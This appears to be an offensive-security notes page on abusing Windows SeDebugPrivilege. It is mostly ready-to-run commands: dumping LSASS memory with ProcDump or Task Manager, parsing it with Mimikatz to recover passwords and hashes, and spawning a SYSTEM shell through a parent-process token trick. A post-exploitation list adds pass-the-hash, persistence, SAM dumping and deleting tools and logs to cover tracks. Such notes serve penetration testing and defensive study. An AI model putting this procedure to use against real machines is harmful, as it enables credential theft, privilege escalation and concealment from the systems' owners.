### Technique Name:

SeDebugPrivilege
### Summary:

`SeDebugPrivilege` allows a user to open, inspect, and manipulate the memory of processes owned by other users—including SYSTEM. This powerful right is meant for developers to debug system services but can be abused by attackers to dump sensitive memory (e.g., LSASS) or impersonate SYSTEM processes, resulting in privilege escalation. It's commonly used to extract credential material or gain SYSTEM access.
### Conditions:

- `SeDebugPrivilege` assigned to current user (can be checked via `whoami /priv`)
- Must run in an **elevated shell** for the privilege to function
- Requires ability to execute local binaries or scripts (e.g., Mimikatz, ProcDump, PowerShell)
- Not all environments allow tool uploads or memory dumping, so RDP or interactive sessions help
### Enumeration:

```powershell
# Check if SeDebugPrivilege is assigned
whoami /priv

# Confirm current user context
whoami

# Optional: Check group policy assignment (manually or via registry)
# Local Policy path: gpedit.msc > Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment
```
### Exploitation:

#### 1. Dumping LSASS with ProcDump
```cmd
# Dump LSASS process memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
#### 2. Parsing Dump with Mimikatz

```cmd
mimikatz.exe

mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### 3. Manual Dump via Task Manager (if RDP access exists)

- Open Task Manager → Details tab → Right-click `lsass.exe` → “Create Dump File”
- Download `.dmp` file and process with Mimikatz
#### 4. SYSTEM Shell via Token Manipulation (PowerShell PoC)

- Download and import the [psgetsystem](https://github.com/decoder-it/psgetsystem) PowerShell script

```powershell
# From elevated PowerShell:
tasklist                         # Identify SYSTEM process like winlogon.exe
[MyProcess]::CreateProcessFromParent(612,"cmd.exe","")
```

Alternatively:

```powershell
$pid = (Get-Process winlogon).Id
[MyProcess]::CreateProcessFromParent($pid,"cmd.exe","")
```
### Post-Exploitation:

* Extract credential material (NTLM hashes, plaintext creds) from LSASS
* Attempt **pass-the-hash** to other machines (if local admin reused)
* Maintain SYSTEM-level persistence (e.g., new service, user, schedule)
* Use SYSTEM shell to bypass local protections, dump SAM/SECURITY
* Clean up: remove dump files, tools, and logs
* Monitor Event ID 4688 and 4673 (privileged process activity and sensitive privilege usage)
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #User_Privs